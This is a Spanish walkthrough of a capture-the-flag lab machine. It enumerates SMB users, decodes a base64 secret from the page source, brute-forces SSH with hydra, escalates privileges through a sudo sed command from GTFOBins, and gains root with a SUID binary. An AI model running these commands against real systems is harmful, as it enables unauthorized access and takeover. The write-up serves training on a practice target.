nmap: 445,80,22,139

![image](https://github.com/user-attachments/assets/3bb1be68-7619-4523-bc23-f1de1268799c)

---
hacemos un: enum4linux -a 172.17.0.2

![image](https://github.com/user-attachments/assets/b905716e-26f1-4f9f-bed5-cdb04ce17655)

Nos da dos nombres: andy y lucas

en el código fuente de la pagina de "Andy's house" hay una contraseña en base64: 

![image](https://github.com/user-attachments/assets/3c9ed1dd-f426-494a-acb2-052b168ccc2b)

> ZXN0b2VzdW5zZWNyZXRvCg==

Usamos: https://www.base64decode.org/es/

    nos da: estoesunsecreto

es un parámetro, así que dejamos la URL de la siguiente forma.

> http://172.17.0.2/estoesunsecreto/mensaje_para_lucas.txt

![image](https://github.com/user-attachments/assets/83682ff4-5a74-4c3f-8049-90d8167b687b)

Lanzamos un ataque de fuerza bruta ya que nos indican que la contraseña es débil:

> hydra -l lucas -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

![image](https://github.com/user-attachments/assets/19976a30-0ace-4715-8afc-29c6b38cc370)

nos da la contraseña de lucas: chocolate

entramos en el ssh con el usuario y contraseña encontrado

![image](https://github.com/user-attachments/assets/52347385-e729-4072-83d2-698c1e2afc24)

utilizamos sudo -l

se escala con sed y lo buscamos en: https://gtfobins.github.io/gtfobins/sed/

colocamos el comando que nos dio y lo modificamos al principio: 

>sudo - u andy sed -n '1e exec sh 1>&0' /etc/hosts

![image](https://github.com/user-attachments/assets/a2ddbad8-728b-47b0-ae98-39e0958f62ac)

ahora buscamos como escalar, y buscando entre carpetas con el comando: 
> find / -perm -4000 -ls 2> /dev/null

Nos da dos ejecutables en " /usr/local/bin ", así que vamos a la ruta que nos muestra.

hay un "privileged_exec"
lo ejecutamos ya que tiene permisos de ejecución con Andy

> ./privileged_exec

![image](https://github.com/user-attachments/assets/77fdb9fe-044d-4732-925a-a5e93f757872)

y somos root!
